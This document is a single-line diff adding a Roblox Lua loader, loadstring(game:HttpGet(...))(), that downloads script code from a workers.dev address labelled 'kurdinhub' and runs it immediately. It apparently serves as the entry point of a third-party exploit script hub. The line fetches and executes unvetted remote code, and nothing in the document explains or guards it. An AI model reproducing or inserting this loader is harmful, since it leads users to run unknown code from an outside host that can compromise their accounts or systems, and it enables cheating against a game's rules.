@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://kurdinhub.script-api.workers.dev"))()
